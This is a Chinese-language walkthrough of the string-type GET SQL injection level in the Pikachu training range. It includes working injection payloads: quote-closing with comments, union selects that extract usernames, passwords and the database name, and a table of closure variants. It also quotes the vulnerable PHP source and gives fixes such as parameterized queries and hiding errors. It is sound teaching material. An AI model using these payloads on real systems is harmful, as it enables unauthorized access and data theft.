# 字符型注入(get) 通关笔记
> 和数字型只差一件事：**参数外面多了一对单引号。**
>
> 于是所有 payload 都必须先"把引号闭合掉"。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → 字符型注入(get) |
| 页面地址 | `http://pikachu/vul/sqli/sqli_str.php` |
| 提交方式 | **GET** |
| 参数名 | `name` |
| 目标 | 拿到数据库里的数据 |
页面是一个输入框，问「what's your username?」。
---
## 二、我的解题步骤
### 步骤 1：先正常查一次
输入 `kobe`：
```
your uid:3
your email is: kobe@pikachu.com
```
### 步骤 2：输入一个单引号试探
输入 `kobe'`：
页面直接报 SQL 语法错误：
```
You have an error in your SQL syntax; check the manual ...
```
**有报错 = 参数进了 SQL = 存在注入。**
### 步骤 3：尝试闭合引号
先试 `kobe' or 1=1`：
```sql
select id,email from member where username='kobe' or 1=1'
```
末尾多了一个 `'` → 语法错误。
需要把末尾那个引号"处理掉"，用 `#` 注释：
```
kobe' or 1=1#
```
```sql
select id,email from member where username='kobe' or 1=1#'
```
**成功。**
### 步骤 4：结果
我实测的对比：
| 输入 | 返回 |
| --- | --- |
| `kobe` | **1 条**（kobe@pikachu.com） |
| `kobe' or 1=1#` | **7 条**（整张 member 表） |
### 步骤 5：继续利用
```sql
-- 猜列数（返回 2 列）
kobe' order by 2#
kobe' order by 3#      -- 报错
-- 联合查询
-1' union select username,password from users#
-- 爆库名
-1' union select 1,database()#
```
---
## 三、原理分析
### 3.1 源码
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username='$name'";
    $result=execute($link, $query);
    ...
}
```
作者注释写得很清楚：
> 这里的变量是字符型，需要考虑闭合
### 3.2 "闭合"到底在做什么
原始 SQL：
```sql
select id,email from member where username='[你输入的内容]'
```
你输入 `kobe' or 1=1#`，代入后：
```sql
select id,email from member where username='kobe' or 1=1#'
```
拆解：
| 片段 | 作用 |
| --- | --- |
| `kobe` | 第一部分值 |
| `'` | **闭合**了 `username='` 那个开引号 |
| ` or 1=1` | 追加的条件，恒真 |
| `#` | 注释掉后面原本的 `'` |
**关键就是那个 `#`——它把"多出来的尾巴"吃掉了。**
### 3.3 注释符的四种写法
| 写法 | 说明 |
| --- | --- |
| `#` | MySQL 特有，后面加空格或直接结束 |
| `-- ` | 标准 SQL，**后面必须有一个空格** |
| `/* */` | 块注释 |
| `;%00` | 空字节截断（部分场景） |
**注意 `--` 后面必须要空格**，写成 `--` 不带空格会失效。
### 3.4 为什么不能用 `kobe' or '1'='1`
其实可以，但更麻烦：
```sql
... where username='kobe' or '1'='1'
```
末尾的 `'` 刚好被 `'1'` 闭合了，不需要注释符。
**但前提是"末尾刚好配上"**，多数情况不如 `#` 通用。
---
## 四、知识点与笔记
### 4.1 字符型注入的判断
| 输入 | 结果 | 说明 |
| --- | --- | --- |
| `kobe` | 正常 | 基准 |
| `kobe'` | **报错** | 引号破坏了语法 |
| `kobe' and '1'='1` | 正常 | 闭合成功 |
| `kobe' and '1'='2` | 没结果 | 确认注入 |
**`kobe'` 报错是标志性特征。**
### 4.2 数字型 vs 字符型
| | 数字型 | 字符型 |
| --- | --- | --- |
| SQL 形式 | `id=$id` | `name='$name'` |
| 输入 `1'` | **报错**（没有引号可闭合） | 可能报错，也可能闭合成功 |
| 输入 `1 and 1=2` | 直接生效 | 需要先闭合 |
| 典型 payload | `1 or 1=1` | `1' or 1=1#` |
### 4.3 常见闭合组合
注入点可能不只被一层引号包着，要观察报错来推断：
| SQL 形式 | 闭合 payload |
| --- | --- |
| `'$name'` | `' or 1=1#` |
| `"$name"` | `" or 1=1#` |
| `('$name')` | `') or 1=1#` |
| `like '%$name%'` | `%' or 1=1#` |
| `('%$name%')` | `%') or 1=1#` |
**看到报错信息里的 `near '...'`，就能反推外面包了几层。**
### 4.4 报错信息是宝藏
```php
function execute($link,$query){
    $result=mysqli_query($link,$query);
    if(mysqli_errno($link)){
        exit(mysqli_error($link));
    }
    return $result;
}
```
`execute()` 会把 SQL 错误**直接输出**。
报错里通常包含：
- `near 'xxx'` → 帮你判断闭合对不对
- 表名、列名 → 帮你猜结构
**生产环境一定要关掉报错回显。**
---
## 五、和数字型的区别
| | 数字型(post) | 字符型(get) |
| --- | --- | --- |
| 提交方式 | POST | GET |
| 引号 | 无 | 有 |
| 闭合 | 不需要 | **必需** |
| payload | `1 or 1=1` | `kobe' or 1=1#` |
| 实测 | 1 条 → 7 条 | 1 条 → 7 条 |
**结果一样，过程多一步"闭合"。**
---
## 六、防御怎么写
### 6.1 参数化
```php
$stmt = $link->prepare("select id,email from member where username=?");
$stmt->bind_param('s', $name);
$stmt->execute();
```
`'s'` 表示字符串，`$name` 只会被当成值，不会被当成 SQL 语法。
### 6.2 关闭报错回显
```php
// 不要这样
exit(mysqli_error($link));
// 应该这样
error_log(mysqli_error($link));
exit('系统繁忙，请稍后再试');
```
### 6.3 转义（次优）
```php
$name = mysqli_real_escape_string($link, $name);
```
**能用，但有坑**：如果数据库字符集设置不当，可能被宽字节绕过（后面有一关专门讲）。
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 字符型要先闭合引号 |
| 判断方法 | `kobe'` 报错 |
| payload | `kobe' or 1=1#` |
| 实测 | 1 条 → 7 条 |
| 修复 | 参数化 + 关报错 |
**一句话**：
> **字符型注入的核心就一个字：闭。**
>
> 把开着的引号闭上，把多余的尾巴注释掉。
---
## 参考
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MySQL: Comments](https://dev.mysql.com/doc/refman/8.0/en/comments.html)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
